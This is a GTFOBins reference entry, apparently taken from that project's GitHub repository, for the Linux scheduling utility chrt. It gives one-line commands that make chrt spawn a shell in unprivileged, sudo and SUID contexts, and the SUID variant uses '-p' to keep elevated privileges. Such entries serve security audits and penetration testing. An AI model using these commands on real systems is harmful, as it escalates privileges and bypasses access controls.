<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/chrt -->
---
functions:
  shell:
  - code: |-
      chrt 1 /bin/sh
    comment: |-
      Any number between 1 and 99 will do.
    contexts:
      sudo:
      suid:
        code: |-
          chrt 1 /bin/sh -p
        shell: false
      unprivileged:
...
